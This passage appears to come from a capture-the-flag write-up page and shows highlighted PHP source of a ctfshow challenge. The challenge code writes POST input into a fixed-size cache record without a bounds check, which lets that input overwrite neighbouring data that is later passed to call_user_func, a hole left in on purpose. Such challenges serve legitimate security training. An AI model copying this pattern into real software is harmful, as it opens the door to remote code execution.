</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">ctfshow</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_1</span> <span class="o">=</span> <span class="mh">0x41</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_2</span> <span class="o">=</span> <span class="mh">0x7b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_3</span> <span class="o">=</span> <span class="mh">0x5b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_4</span> <span class="o">=</span> <span class="mh">0x60</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_5</span> <span class="o">=</span> <span class="mh">0x30</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_OFFSET_6</span> <span class="o">=</span> <span class="mh">0x5f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_SIZE__</span><span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">__REF_VAL_SIZE__</span><span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$cursor</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$cache</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$ref_table</span><span class="o">=</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$flag</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">define</span><span class="p">(</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">,</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_VAL_SIZE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">define</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$flag</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">neaten</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fill</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fill</span><span class="p">(</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">)</span><span class="o">===</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">fill</span><span class="p">(</span><span class="nv">$ref</span><span class="p">,</span><span class="nv">$val</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">rewind</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fseek</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="nv">$ref</span><span class="p">]</span><span class="o">+</span><span class="mi">23</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="nv">$val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nx">pack</span><span class="p">(</span><span class="s2">&#34;C&#34;</span><span class="p">,</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nx">sizeof</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_VAL_SIZE__</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nx">pack</span><span class="p">(</span><span class="s2">&#34;C&#34;</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="o">=</span> <span class="nx">ftell</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">clear</span><span class="p">(</span><span class="nv">$var</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">neaten</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="s1">&#39;_clear_&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="s2">&#34;_clear_&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">),</span><span class="s2">&#34;C&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nx">sizeof</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span><span class="s1">&#39;C&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$arr</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="no">__NAMESPACE__</span><span class="o">.</span><span class="s2">&#34;\C::clear&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">),</span><span class="s2">&#34;C&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="mh">0x36d</span><span class="p">,</span><span class="s1">&#39;Q&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="s1">&#39;C&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span><span class="s1">&#39;C&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">readNeaten</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">rewind</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fseek</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="s1">&#39;_clear_&#39;</span><span class="p">]</span><span class="o">+</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$f</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">truncation</span><span class="p">(</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="o">-</span><span class="mi">4</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$t</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">truncation</span><span class="p">(</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="o">-</span><span class="mi">12</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$p</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">truncation</span><span class="p">(</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">define</span><span class="p">(</span><span class="nv">$ref</span><span class="p">,</span><span class="nv">$size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkRef</span><span class="p">(</span><span class="nv">$ref</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$r</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="nv">$ref</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="nv">$ref</span><span class="p">]</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$r</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">),</span><span class="s2">&#34;C&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nx">sizeof</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span><span class="s1">&#39;C&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span><span class="nx">pack</span><span class="p">(</span><span class="s2">&#34;v&#34;</span><span class="p">,</span><span class="nv">$size</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span><span class="nx">pack</span><span class="p">(</span><span class="s2">&#34;C&#34;</span><span class="p">,</span><span class="mh">0x31</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="o">=</span> <span class="nx">ftell</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$size</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$ref</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">array_key_exists</span><span class="p">(</span><span class="nv">$ref</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">\Exception</span><span class="p">(</span><span class="s2">&#34;Ref not exists!&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="nv">$ref</span><span class="p">]</span><span class="o">!=</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">seekCursor</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ref_table</span><span class="p">[</span><span class="nv">$ref</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">rewind</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nv">$cref</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$csize</span> <span class="o">=</span> <span class="nx">unpack</span><span class="p">(</span><span class="s2">&#34;v&#34;</span><span class="p">,</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="mi">2</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$usize</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$val</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nv">$csize</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">truncation</span><span class="p">(</span><span class="nv">$val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">write</span><span class="p">(</span><span class="nv">$val</span><span class="p">,</span><span class="nv">$fmt</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">seek</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span><span class="nx">pack</span><span class="p">(</span><span class="nv">$fmt</span><span class="p">,</span><span class="nv">$val</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="o">=</span> <span class="nx">ftell</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">seek</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">rewind</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fseek</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cursor</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">truncation</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">implode</span><span class="p">(</span><span class="nx">array_filter</span><span class="p">(</span><span class="nx">str_split</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span><span class="k">function</span><span class="p">(</span><span class="nv">$var</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$var</span><span class="o">!==</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">seekCursor</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">rewind</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fseek</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">,</span> <span class="nv">$cursor</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">checkRef</span><span class="p">(</span><span class="nv">$ref</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$r</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="nv">$ref</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">sizeof</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">&gt;</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_SIZE__</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">\Exception</span><span class="p">(</span><span class="s2">&#34;Refenerce size too long!&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkByte</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">0</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">\Exception</span><span class="p">(</span><span class="s2">&#34;Ref invalid!&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
